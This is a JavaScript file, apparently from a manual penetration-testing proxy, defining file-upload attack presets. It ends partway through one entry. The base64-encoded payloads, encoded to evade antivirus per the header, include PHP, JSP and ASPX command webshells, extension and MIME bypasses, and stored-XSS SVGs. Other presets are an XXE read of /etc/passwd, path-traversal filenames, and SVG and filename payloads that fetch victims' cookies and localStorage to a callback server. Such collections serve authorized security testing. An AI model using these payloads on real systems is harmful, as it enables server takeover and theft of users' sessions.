/**
 * Upload attack presets for the intercept multipart editor.
 *
 * All payload content is stored base64-encoded to avoid AV false positives
 * on security-testing strings. Decoded lazily using the OOB server URL
 * from Settings (fetched via /api/settings/oob).
 *
 * Select a preset from the dropdown, click Apply, review, then Forward.
 * One request at a time, fully manual.
 *
 * OOB presets use the format: http://{CALLBACK}/upload/{token}
 * where "upload" is the fixed scan key and {token} identifies the trigger.
 * Query all manual upload hits: GET /api/callbacks/upload
 */

window.UploadPresets = (() => {
    function _getOobUrl() {
        const el = document.getElementById('oob-server-url');
        return (el && el.value) ? el.value.trim().replace(/\/+$/, '') : '';
    }
    const _d = (b64) => atob(b64).replace(/\{\{CALLBACK\}\}/g, _getOobUrl());

    const presets = [

        // -- Extension Bypass -------------------------------------------------

        {
            id: 'ext-double',
            category: 'Extension Bypass',
            name: 'Double extension (.php.jpg)',
            description: 'Tests if the server only checks the final extension.',
            filename: 'shell.php.jpg',
            content_type: 'image/jpeg',
            _enc: 'PD9waHAgZWNobyAiUkNFX09LIjsgPz4=',
        },
        {
            id: 'ext-null-byte',
            category: 'Extension Bypass',
            name: 'Null byte (.php%00.jpg)',
            description: 'Null byte truncation — older runtimes may ignore everything after \\x00.',
            filename: 'shell.php%00.jpg',
            content_type: 'image/jpeg',
            _enc: 'PD9waHAgZWNobyAiUkNFX09LIjsgPz4=',
        },
        {
            id: 'ext-case-swap',
            category: 'Extension Bypass',
            name: 'Case swap (.pHp)',
            description: 'Mixed-case extension to bypass case-sensitive blocklists.',
            filename: 'shell.pHp',
            content_type: 'application/x-httpd-php',
            _enc: 'PD9waHAgZWNobyAiUkNFX09LIjsgPz4=',
        },
        {
            id: 'ext-trailing-dot',
            category: 'Extension Bypass',
            name: 'Trailing dot (.php.)',
            description: 'Trailing dot — Windows and some servers strip it, leaving .php.',
            filename: 'shell.php.',
            content_type: 'application/octet-stream',
            _enc: 'PD9waHAgZWNobyAiUkNFX09LIjsgPz4=',
        },
        {
            id: 'ext-alt-php',
            category: 'Extension Bypass',
            name: 'Alt PHP ext (.phtml)',
            description: 'Alternative PHP extension that may still be executed by Apache.',
            filename: 'shell.phtml',
            content_type: 'application/octet-stream',
            _enc: 'PD9waHAgZWNobyAiUkNFX09LIjsgPz4=',
        },
        {
            id: 'ext-htaccess',
            category: 'Extension Bypass',
            name: '.htaccess override',
            description: 'Upload .htaccess to make .txt files execute as PHP.',
            filename: '.htaccess',
            content_type: 'text/plain',
            _enc: 'QWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLXBocCAudHh0',
        },

        // -- MIME Mismatch ----------------------------------------------------

        {
            id: 'mime-php-as-image',
            category: 'MIME Mismatch',
            name: 'PHP body, image/jpeg MIME',
            description: 'Server trusts Content-Type but body is PHP.',
            filename: 'avatar.php',
            content_type: 'image/jpeg',
            _enc: 'PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+',
        },
        {
            id: 'mime-jsp-as-image',
            category: 'MIME Mismatch',
            name: 'JSP body, image/png MIME',
            description: 'JSP webshell disguised as PNG via Content-Type.',
            filename: 'image.jsp',
            content_type: 'image/png',
            _enc: 'PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiJT48JSBQcm9jZXNzIHA9UnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpOyBTY2FubmVyIHM9bmV3IFNjYW5uZXIocC5nZXRJbnB1dFN0cmVhbSgpKS51c2VEZWxpbWl0ZXIoIlxBIik7IG91dC5wcmludChzLmhhc05leHQoKT9zLm5leHQoKToiIik7ICU+',
        },
        {
            id: 'mime-html-as-image',
            category: 'MIME Mismatch',
            name: 'HTML body, image/gif MIME',
            description: 'Tests if uploaded file is served back with the original Content-Type, enabling stored XSS.',
            filename: 'pic.gif',
            content_type: 'image/gif',
            _enc: 'PGh0bWw+PGJvZHk+PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+PC9ib2R5PjwvaHRtbD4=',
        },

        // -- Polyglot Files ---------------------------------------------------

        {
            id: 'poly-gif-php',
            category: 'Polyglot',
            name: 'GIF89a + PHP',
            description: 'Starts with valid GIF magic bytes, followed by PHP code. Passes magic-byte checks.',
            filename: 'image.php.gif',
            content_type: 'image/gif',
            _enc: 'R0lGODlhOzw/cGhwIGVjaG8gIlJDRV9PSyI7ID8+',
        },
        {
            id: 'poly-png-php',
            category: 'Polyglot',
            name: 'PNG header + PHP (binary)',
            description: 'Minimal PNG header bytes followed by PHP payload. Binary preset.',
            filename: 'image.php.png',
            content_type: 'image/png',
            is_binary: true,
            content_b64: 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggjw/cGhwIGVjaG8gIlJDRV9PSyI7ID8+',
        },
        {
            id: 'poly-bmp-js',
            category: 'Polyglot',
            name: 'BMP + JavaScript',
            description: 'BM header that doubles as valid JS. Tests XSS via image upload when served inline.',
            filename: 'image.bmp.html',
            content_type: 'image/bmp',
            _enc: 'Qk08c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4=',
        },

        // -- SVG Attacks ------------------------------------------------------

        {
            id: 'svg-benign',
            category: 'SVG',
            name: 'Benign smiley face (baseline)',
            description: 'Clean SVG that renders a yellow smiley face. Use this to confirm the upload/render pipeline works before trying attack payloads.',
            filename: 'smiley.svg',
            content_type: 'image/svg+xml',
            _enc: 'PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIiB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+CiAgPCEtLSBZZWxsb3cgZmFjZSAtLT4KICA8Y2lyY2xlIGN4PSI1MCIgY3k9IjUwIiByPSI0NSIgZmlsbD0iI0ZGRDcwMCIgc3Ryb2tlPSIjMzMzIiBzdHJva2Utd2lkdGg9IjIiLz4KICA8IS0tIExlZnQgZXllIC0tPgogIDxjaXJjbGUgY3g9IjM1IiBjeT0iMzgiIHI9IjUiIGZpbGw9IiMzMzMiLz4KICA8IS0tIFJpZ2h0IGV5ZSAtLT4KICA8Y2lyY2xlIGN4PSI2NSIgY3k9IjM4IiByPSI1IiBmaWxsPSIjMzMzIi8+CiAgPCEtLSBTbWlsZSAtLT4KICA8cGF0aCBkPSJNIDMwIDYwIFEgNTAgODAgNzAgNjAiIHN0cm9rZT0iIzMzMyIgc3Ryb2tlLXdpZHRoPSIzIiBmaWxsPSJub25lIiBzdHJva2UtbGluZWNhcD0icm91bmQiLz4KPC9zdmc+',
        },
        {
            id: 'svg-xss',
            category: 'SVG',
            name: 'SVG with inline script (XSS)',
            description: 'SVG containing <script> — stored XSS if served as image/svg+xml.',
            filename: 'image.svg',
            content_type: 'image/svg+xml',
            _enc: 'PD94bWwgdmVyc2lvbj0iMS4wIj8+CjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4KPC9zdmc+',
        },
        {
            id: 'svg-onload',
            category: 'SVG',
            name: 'SVG onload event (XSS)',
            description: 'SVG using onload attribute — no <script> tag to bypass naive filters.',
            filename: 'icon.svg',
            content_type: 'image/svg+xml',
            _enc: 'PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoZG9jdW1lbnQuZG9tYWluKSI+PHJlY3Qgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiLz48L3N2Zz4=',
        },
        {
            id: 'svg-xxe',
            category: 'SVG',
            name: 'SVG with XXE',
            description: 'SVG containing an external entity — tests for XXE during server-side image processing.',
            filename: 'image.svg',
            content_type: 'image/svg+xml',
            _enc: 'PD94bWwgdmVyc2lvbj0iMS4wIj8+CjwhRE9DVFlQRSBzdmcgWwogIDwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCI+Cl0+CjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8dGV4dD4meHhlOzwvdGV4dD4KPC9zdmc+',
        },

        // -- SVG (React + Flask specific) ----------------------------------------

        {
            id: 'svg-foreignobject',
            category: 'SVG (React/Flask)',
            name: 'foreignObject HTML embed',
            description: 'Embeds full HTML inside SVG via <foreignObject>. Bypasses SVG-only sanitizers. Fires if inlined via dangerouslySetInnerHTML or react-svg.',
            filename: 'chart.svg',
            content_type: 'image/svg+xml',
            _enc: 'PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMDAiIGhlaWdodD0iMjAwIj4KICA8Zm9yZWlnbk9iamVjdCB3aWR0aD0iMjAwIiBoZWlnaHQ9IjIwMCI+CiAgICA8Ym9keSB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+CiAgICAgIDxzY3JpcHQ+YWxlcnQoZG9jdW1lbnQuZG9tYWluKTwvc2NyaXB0PgogICAgICA8aWZyYW1lIHNyYz0iamF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4pIj48L2lmcmFtZT4KICAgIDwvYm9keT4KICA8L2ZvcmVpZ25PYmplY3Q+Cjwvc3ZnPg==',
        },
        {
            id: 'svg-animate-onbegin',
            category: 'SVG (React/Flask)',
            name: 'animate onbegin (no script tag)',
            description: 'Uses <animate onbegin> event handler — no <script> tag, bypasses tag-based filters. Works in inline SVG.',
            filename: 'anim.svg',
            content_type: 'image/svg+xml',
            _enc: 'PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxhbmltYXRlIGF0dHJpYnV0ZU5hbWU9IngiIHZhbHVlcz0iMCIgYmVnaW49IjBzIiBvbmJlZ2luPSJhbGVydChkb2N1bWVudC5kb21haW4pIi8+CiAgPHJlY3Qgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiLz4KPC9zdmc+',
        },
        {
            id: 'svg-onfocusin',
            category: 'SVG (React/Flask)',
            name: 'onfocusin autofocus (no click)',
            description: 'Triggers XSS on focus without user interaction. If React inlines the SVG, autofocus fires immediately.',
            filename: 'icon.svg',
            content_type: 'image/svg+xml',
            _enc: 'PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxyZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIiB0YWJpbmRleD0iMCIgb25mb2N1c2luPSJhbGVydChkb2N1bWVudC5kb21haW4pIiBhdXRvZm9jdXM9ImF1dG9mb2N1cyIvPgo8L3N2Zz4=',
        },
        {
            id: 'svg-javascript-uri',
            category: 'SVG (React/Flask)',
            name: 'javascript: URI in <a> link',
            description: 'SVG <a> with javascript: href. React does not sanitize href attrs — fires on click if SVG is rendered inline.',
            filename: 'link.svg',
            content_type: 'image/svg+xml',
            _enc: 'PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj4KICA8YSB4bGluazpocmVmPSJqYXZhc2NyaXB0OmFsZXJ0KGRvY3VtZW50LmRvbWFpbikiPgogICAgPHJlY3Qgd2lkdGg9IjIwMCIgaGVpZ2h0PSIyMDAiIGZpbGw9InRyYW5zcGFyZW50Ii8+CiAgICA8dGV4dCB4PSIxMCIgeT0iMTAwIiBmaWxsPSJibHVlIj5DbGljayBtZTwvdGV4dD4KICA8L2E+Cjwvc3ZnPg==',
        },
        {
            id: 'svg-css-import-ssrf',
            category: 'SVG (React/Flask)',
            name: 'CSS @import SSRF (OOB)',
            description: 'SVG with CSS @import — triggers SSRF when Flask backend processes/renders the SVG with cairosvg, Pillow, or ImageMagick.',
            filename: 'styled.svg',
            content_type: 'image/svg+xml',
            _enc: 'PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxzdHlsZT4KICAgIEBpbXBvcnQgdXJsKCJodHRwOi8ve3tDQUxMQkFDS319L3VwbG9hZC9jc3MtaW1wb3J0Iik7CiAgPC9zdHlsZT4KICA8cmVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIvPgo8L3N2Zz4=',
        },
        {
            id: 'svg-use-external',
            category: 'SVG (React/Flask)',
            name: '<use> external ref SSRF (OOB)',
            description: 'SVG <use> referencing an external SVG. Triggers SSRF during server-side SVG parsing (librsvg, cairosvg).',
            filename: 'ref.svg',
            content_type: 'image/svg+xml',
            _enc: 'PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj4KICA8dXNlIHhsaW5rOmhyZWY9Imh0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL3VzZS1ocmVmI3BheWxvYWQiLz4KPC9zdmc+',
        },
        {
            id: 'svg-image-ssrf',
            category: 'SVG (React/Flask)',
            name: '<image> SSRF (OOB)',
            description: 'SVG <image> tag fetches external resource. Triggers when Flask processes the SVG server-side.',
            filename: 'embed.svg',
            content_type: 'image/svg+xml',
            _enc: 'PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj4KICA8aW1hZ2UgeGxpbms6aHJlZj0iaHR0cDovL3t7Q0FMTEJBQ0t9fS91cGxvYWQvaW1hZ2UtaHJlZiIgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiLz4KPC9zdmc+',
        },
        {
            id: 'svg-data-uri-script',
            category: 'SVG (React/Flask)',
            name: 'data: URI script (CSP bypass)',
            description: 'SVG <script> loaded via data: URI. Bypasses CSP if data: is allowed in script-src.',
            filename: 'data.svg',
            content_type: 'image/svg+xml',
            _enc: 'PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxzY3JpcHQgeGxpbms6aHJlZj0iZGF0YTp0ZXh0L2phdmFzY3JpcHQsYWxlcnQoZG9jdW1lbnQuZG9tYWluKSIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiLz4KPC9zdmc+',
        },
        {
            id: 'svg-cdata-mutation',
            category: 'SVG (React/Flask)',
            name: 'CDATA mutation XSS',
            description: 'Exploits parser differences with CDATA sections. Bypasses older DOMPurify versions and some server-side sanitizers.',
            filename: 'desc.svg',
            content_type: 'image/svg+xml',
            _enc: 'PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxkZXNjPgogICAgPCFbQ0RBVEFbPC9kZXNjPjxzY3JpcHQ+YWxlcnQoZG9jdW1lbnQuZG9tYWluKTwvc2NyaXB0Pl1dPgogIDwvZGVzYz4KPC9zdmc+',
        },
        {
            id: 'svg-fetch-exfil',
            category: 'SVG (React/Flask)',
            name: 'fetch() cookie exfiltration (OOB)',
            description: 'SVG onload uses fetch() to steal cookies/tokens to your OOB server. Tests if inline SVG has same-origin access.',
            filename: 'exfil.svg',
            content_type: 'image/svg+xml',
            _enc: 'PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iZmV0Y2goJ2h0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL2ZldGNoLWV4ZmlsP2Q9JytlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKSkiPgogIDxyZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIi8+Cjwvc3ZnPg==',
        },
        {
            id: 'svg-mega-oob',
            category: 'SVG (React/Flask)',
            name: 'MEGA: all triggers in one SVG (OOB)',
            description: 'Single SVG with every trigger mechanism — each hits /upload/{token}. Covers: onload, hover, focusin, animate, set, click, css-import, image-href, use-href, foreignobj, fetch cookies+localStorage+URL.',
            filename: 'preview.svg',
            content_type: 'image/svg+xml',
            _enc: 'PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2aWV3Qm94PSIwIDAgNTAwIDUwMCIgd2lkdGg9IjUwMCIgaGVpZ2h0PSI1MDAiCiAgb25sb2FkPSJuZXcgSW1hZ2UoKS5zcmM9J2h0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL29ubG9hZD90cz0nK0RhdGUubm93KCkiPgoKICA8cmVjdCB3aWR0aD0iNTAwIiBoZWlnaHQ9IjUwMCIgZmlsbD0iI2Y1ZjVmNSIgcng9IjEyIi8+CiAgPHRleHQgeD0iMjUwIiB5PSIxMDAiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMjgiIGZpbGw9IiMzMzMiPkRvY3VtZW50IFByZXZpZXc8L3RleHQ+CiAgPHRleHQgeD0iMjUwIiB5PSIxNDAiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMTQiIGZpbGw9IiM5OTkiPkxvYWRpbmcgY29udGVudC4uLjwvdGV4dD4KCiAgPHN0eWxlPkBpbXBvcnQgdXJsKCJodHRwOi8ve3tDQUxMQkFDS319L3VwbG9hZC9jc3MtaW1wb3J0Iik7PC9zdHlsZT4KCiAgPGltYWdlIHhsaW5rOmhyZWY9Imh0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL2ltYWdlLWhyZWYiIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIG9wYWNpdHk9IjAiLz4KICA8dXNlIHhsaW5rOmhyZWY9Imh0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL3VzZS1ocmVmI3AiIHdpZHRoPSIxIiBoZWlnaHQ9IjEiLz4KCiAgPGFuaW1hdGUgYXR0cmlidXRlTmFtZT0ieCIgdmFsdWVzPSIwIiBiZWdpbj0iMHMiCiAgICBvbmJlZ2luPSJuZXcgSW1hZ2UoKS5zcmM9J2h0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL2FuaW1hdGUtYmVnaW4/dHM9JytEYXRlLm5vdygpIi8+CgogIDxzZXQgYXR0cmlidXRlTmFtZT0ib3BhY2l0eSIgdG89IjEiIGJlZ2luPSIwcyIKICAgIG9uYmVnaW49Im5ldyBJbWFnZSgpLnNyYz0naHR0cDovL3t7Q0FMTEJBQ0t9fS91cGxvYWQvc2V0LWJlZ2luP3RzPScrRGF0ZS5ub3coKSIvPgoKICA8cmVjdCB4PSIwIiB5PSIwIiB3aWR0aD0iNTAwIiBoZWlnaHQ9IjUwMCIgZmlsbD0ibm9uZSIgdGFiaW5kZXg9IjAiIGF1dG9mb2N1cz0iYXV0b2ZvY3VzIgogICAgb25mb2N1c2luPSJuZXcgSW1hZ2UoKS5zcmM9J2h0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL2ZvY3VzaW4/dHM9JytEYXRlLm5vdygpIi8+CgogIDxyZWN0IHdpZHRoPSI1MDAiIGhlaWdodD0iNTAwIiBmaWxsPSJ0cmFuc3BhcmVudCIKICAgIG9ubW91c2VvdmVyPSJ0aGlzLnJlbW92ZUF0dHJpYnV0ZSgnb25tb3VzZW92ZXInKTtuZXcgSW1hZ2UoKS5zcmM9J2h0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL2hvdmVyP3RzPScrRGF0ZS5ub3coKSIvPgoKICA8YSB4bGluazpocmVmPSJodHRwOi8ve3tDQUxMQkFDS319L3VwbG9hZC9jbGljayI+CiAgICA8cmVjdCB4PSIxMDAiIHk9IjIyMCIgd2lkdGg9IjMwMCIgaGVpZ2h0PSI2MCIgZmlsbD0iIzRhOTBkOSIgcng9IjgiLz4KICAgIDx0ZXh0IHg9IjI1MCIgeT0iMjU4IiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXNpemU9IjE4IiBmaWxsPSIjZmZmIj5DbGljayB0byB2aWV3IGRldGFpbHM8L3RleHQ+CiAgPC9hPgoKICA8Zm9yZWlnbk9iamVjdCB3aWR0aD0iMSIgaGVpZ2h0PSIxIiB4PSI0OTkiIHk9IjQ5OSI+CiAgICA8Ym9keSB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+CiAgICAgIDxpbWcgc3JjPSJodHRwOi8ve3tDQUxMQkFDS319L3VwbG9hZC9mb3JlaWdub2JqIiBzdHlsZT0iZGlzcGxheTpub25lIi8+CiAgICA8L2JvZHk+CiAgPC9mb3JlaWduT2JqZWN0PgoKICA8c2NyaXB0PgogICAgZmV0Y2goJ2h0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL2ZldGNoLWNvb2tpZXM/ZD0nK2VuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWUpKTsKICAgIHRyeXtmZXRjaCgnaHR0cDovL3t7Q0FMTEJBQ0t9fS91cGxvYWQvZmV0Y2gtbHM/ZD0nK2VuY29kZVVSSUNvbXBvbmVudChKU09OLnN0cmluZ2lmeShsb2NhbFN0b3JhZ2UpKSl9Y2F0Y2goZSl7fQogICAgZmV0Y2goJ2h0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL2ZldGNoLXVybD9kPScrZW5jb2RlVVJJQ29tcG9uZW50KGxvY2F0aW9uLmhyZWYpKTsKICA8L3NjcmlwdD4KCjwvc3ZnPg==',
        },

        // -- Path Traversal ---------------------------------------------------

        {
            id: 'path-unix',
            category: 'Path Traversal',
            name: 'Unix path traversal',
            description: 'Filename with ../ sequences — tests if the server writes outside the upload directory.',
            filename: '../../../tmp/pwned.txt',
            content_type: 'text/plain',
            _enc: 'cGF0aF90cmF2ZXJzYWxfb2s=',
        },
        {
            id: 'path-windows',
            category: 'Path Traversal',
            name: 'Windows path traversal',
            description: 'Backslash traversal for Windows servers.',
            filename: '..\\..\\..\\temp\\pwned.txt',
            content_type: 'text/plain',
            _enc: 'cGF0aF90cmF2ZXJzYWxfb2s=',
        },
        {
            id: 'path-url-encoded',
            category: 'Path Traversal',
            name: 'URL-encoded traversal',
            description: 'Double URL-encoded ../ to bypass basic path sanitisation.',
            filename: '..%252f..%252f..%252ftmp%252fpwned.txt',
            content_type: 'text/plain',
            _enc: 'cGF0aF90cmF2ZXJzYWxfb2s=',
        },

        // -- Filename Injection (attribute breakout) ----------------------------

        {
            id: 'fname-onerror',
            category: 'Filename Injection',
            name: 'alt attr breakout → onerror',
            description: 'Breaks out of the alt="" attribute and injects onerror. Tests if the app renders filenames unsanitized in img alt/title attributes.',
            filename: '" onerror="alert(document.domain)" x="',
            content_type: 'image/svg+xml',
            _enc: 'PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxIiBoZWlnaHQ9IjEiLz48L3N2Zz4=',
        },
        {
            id: 'fname-onmouseover',
            category: 'Filename Injection',
            name: 'alt attr breakout → onmouseover',
            description: 'Injects onmouseover with a full-screen overlay so it triggers on any mouse movement. No click needed.',
            filename: '" onmouseover="alert(document.domain)" style="position:fixed;top:0;left:0;width:100%;height:100%" x="',
            content_type: 'image/svg+xml',
            _enc: 'PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxIiBoZWlnaHQ9IjEiLz48L3N2Zz4=',
        },
        {
            id: 'fname-tag-inject',
            category: 'Filename Injection',
            name: 'Close tag + script injection',
            description: 'Closes the img tag and injects a script element. Tests if the app uses innerHTML or dangerouslySetInnerHTML with filenames.',
            filename: '"><script>alert(document.domain)</script><img x="',
            content_type: 'image/svg+xml',
            _enc: 'PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxIiBoZWlnaHQ9IjEiLz48L3N2Zz4=',
        },
        {
            id: 'fname-oob-exfil',
            category: 'Filename Injection',
            name: 'attr breakout → fetch exfil (OOB)',
            description: 'Breaks out of alt attr and exfiltrates cookies via fetch to your OOB server.',
            filename: '" onfocus="fetch(\'http://{{CALLBACK}}/upload/fname-exfil?d=\'+encodeURIComponent(document.cookie))" tabindex="0" autofocus="',
            content_type: 'image/svg+xml',
            _enc: 'PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxIiBoZWlnaHQ9IjEiLz48L3N2Zz4=',
        },

        // -- Webshells --------------------------------------------------------

        {
            id: 'shell-php',
            category: 'Webshell',
            name: 'PHP system() shell',
            description: 'Minimal PHP webshell — ?cmd=id to test.',
            filename: 'cmd.php',
            content_type: 'application/x-httpd-php',
            _enc: 'PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUWyJjbWQiXSkpe3N5c3RlbSgkX1JFUVVFU1RbImNtZCJdKTt9ID8+',
        },
        {
            id: 'shell-php-short',
            category: 'Webshell',
            name: 'PHP short tag shell',
            description: 'Uses short open tags — works when short_open_tag is On.',
            filename: 'cmd.php',
            content_type: 'application/x-httpd-php',
            _enc: 'PD89YCRfR0VUW2NtZF1gPz4=',
        },
        {
            id: 'shell-jsp',
            category: 'Webshell',
            name: 'JSP webshell',
            description: 'Minimal JSP command execution shell.',
            filename: 'cmd.jsp',
            content_type: 'application/octet-stream',
            _enc: 'PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiJT4KPCUKUHJvY2VzcyBwPVJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKTsKU2Nhbm5lciBzPW5ldyBTY2FubmVyKHAuZ2V0SW5wdXRTdHJlYW0oKSkudXNlRGVsaW1pdGVyKCJcQSIpOwpvdXQucHJpbnQocy5oYXNOZXh0KCk/cy5uZXh0KCk6IiIpOwolPg==',
        },
        {
            id: 'shell-aspx',
            category: 'Webshell',
            name: 'ASPX webshell',
            description: 'Minimal ASPX command execution shell for IIS/.NET.',
            filename: 'cmd.aspx',
            content_type: 'application/octet-stream',
            _enc: 'PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiAlPgo8JUAgSW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLkRpYWdub3N0aWNzIiAlPgo8JQp2YXIgcD1uZXcgUHJvY2VzcygpOwpwLlN0YXJ0SW5mby5GaWxlTmFtZT0iY21kLmV4ZSI7CnAuU3RhcnRJbmZvLkFyZ3VtZW50cz0iL2MgIitSZXF1ZXN0WyJjbWQiXTsKcC5TdGFydEluZm8uUmVkaXJlY3RTdGFuZGFyZE91dHB1dD10cnVlOwpwLlN0YXJ0SW5mby5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7CnAuU3RhcnQoKTsKUmVzcG9uc2UuV3JpdGUocC5TdGFuZGFyZE91dHB1dC5SZWFkVG9FbmQoKSk7CiU+',
        },

        // -- Out-of-Band (OOB) ------------------------------------------------

        {
            id: 'oob-xxe-http',
            category: 'Out-of-Band',
            name: 'XXE OOB via HTTP',
            description: 'XML with external entity fetching from your callback server.',
            filename: 'oob.xml',
            content_type: 'application/xml',
            _enc: 'PD94bWwgdmVyc2lvbj0iMS4wIj8+CjwhRE9DVFlQRSBmb28gWwogIDwhRU5USVRZIHh4ZSBTWVNURU0gImh0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL3h4ZS1odHRwIj4KXT4KPHJvb3Q+Jnh4ZTs8L3Jvb3Q+',
        },
        {
            id: 'oob-xxe-dns',
            category: 'Out-of-Band',
            name: 'XXE OOB via DNS',
            description: 'External entity triggering a DNS lookup.',
            filename: 'oob.xml',
            content_type: 'application/xml',
            _enc: 'PD94bWwgdmVyc2lvbj0iMS4wIj8+CjwhRE9DVFlQRSBmb28gWwogIDwhRU5USVRZIHh4ZSBTWVNURU0gImh0dHA6Ly94eGUtZG5zLnt7Q0FMTEJBQ0t9fSI+Cl0+Cjxyb290PiZ4eGU7PC9yb290Pg==',
        },
        {
            id: 'oob-svg-xxe',
            category: 'Out-of-Band',
            name: 'SVG + XXE OOB callback',
            description: 'SVG processed server-side triggers OOB XXE.',
            filename: 'oob.svg',
            content_type: 'image/svg+xml',
            _enc: 'PD94bWwgdmVyc2lvbj0iMS4wIj8+CjwhRE9DVFlQRSBzdmcgWwogIDwhRU5USVRZIHh4ZSBTWVNURU0gImh0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL3N2Zy14eGUiPgpdPgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiPgogIDx0ZXh0IHg9IjAiIHk9IjIwIj4meHhlOzwvdGV4dD4KPC9zdmc+',
        },
        {
            id: 'oob-ssrf-pdf',
            category: 'Out-of-Band',
            name: 'PDF click-to-redirect (OOB)',
            description: 'PDF with full-page link annotation. Click anywhere to redirect to OOB server. Works in all browser PDF viewers.',
            filename: 'document.pdf',
            content_type: 'application/pdf',
